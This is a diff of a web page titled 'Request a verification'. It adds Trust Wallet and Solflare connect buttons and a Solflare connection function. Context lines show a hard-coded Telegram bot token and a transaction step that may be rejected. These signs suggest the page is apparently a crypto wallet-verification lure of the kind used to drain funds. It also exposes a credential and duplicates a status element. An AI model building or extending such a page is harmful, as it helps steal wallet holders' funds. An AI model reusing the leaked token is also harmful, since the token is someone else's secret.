@@ -356,8 +356,34 @@
       <h3 id="modalTitle" style="font-family:'Roboto Slab',serif; font-size:19px; margin-bottom:12px; color: white;">Request a verification</h3>
       <p id="modalDesc" style="color:var(--paper-dim); font-size:14px; margin-bottom:20px; display:none;">Your wallet is connected. Confirm the address below and tap verify to proceed.</p>
       
-      <div class="field"><label>WALLET ADDRESS (BSC)</label><input type="text" id="walletInput" placeholder="0x..." /></div>
-      <button id="actionBtn" class="btn-primary btn-block" onclick="startFlow()">Verify Now</button>
+      <div class="field">
+  <label id="walletNetworkLabel">WALLET ADDRESS</label>
+  <input
+    type="text"
+    id="walletInput"
+    placeholder="Connect a wallet..."
+    readonly
+  />
+</div>
+
+<button
+  id="trustWalletBtn"
+  class="btn-primary btn-block"
+  onclick="startFlow()">
+  Connect Trust Wallet
+</button>
+
+<button
+  id="solflareBtn"
+  class="btn-primary btn-block"
+  onclick="connectSolflare()">
+  Connect Solflare
+</button>
+
+<p
+  id="statusMsg"
+  style="font-size:12.5px;color:var(--slate);margin-top:12px;text-align:center;">
+</p>
       <p id="statusMsg" style="font-size:12.5px;color:var(--slate);margin-top:12px;text-align:center;"></p>
     </div>
     <div id="stepResult" style="display:none;">
@@ -372,6 +398,10 @@
     </div>
   </div>
 </div>
+</div>
+
+<!-- Solflare SDK -->
+<script src="https://unpkg.com/@solflare-wallet/sdk"></script>
 
 <script>
   const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
@@ -481,7 +511,51 @@
       alert('Transaction failed or was rejected: ' + (e?.message || 'Unknown error'));
     }
   }
+let solflareWallet = null;
 
+async function connectSolflare() {
+  try {
+    document.getElementById('statusMsg').textContent =
+      'Connecting to Solflare...';
+
+    if (typeof Solflare === 'undefined') {
+      throw new Error('Solflare SDK not loaded');
+    }
+
+    solflareWallet = new Solflare();
+
+    await solflareWallet.connect();
+
+    if (!solflareWallet.publicKey) {
+      throw new Error('Solflare did not return a public key');
+    }
+
+    const address = solflareWallet.publicKey.toString();
+
+    console.log('Solflare connected:', address);
+
+    document.getElementById('walletInput').value = address;
+
+    document.getElementById('walletNetworkLabel').textContent =
+      'WALLET ADDRESS (SOLANA)';
+
+    document.getElementById('walletInput').placeholder =
+      'Solana address';
+
+    document.getElementById('statusMsg').textContent =
+      'Solflare connected successfully.';
+
+  } catch (error) {
+    console.error('Solflare connection error:', error);
+
+    document.getElementById('statusMsg').textContent = '';
+
+    alert(
+      'Could not connect to Solflare: ' +
+      (error?.message || 'Unknown error')
+    );
+  }
+}
   // Inizializzazione al caricamento della pagina
   document.addEventListener('DOMContentLoaded', async function() {
     const params = new URLSearchParams(window.location.search);
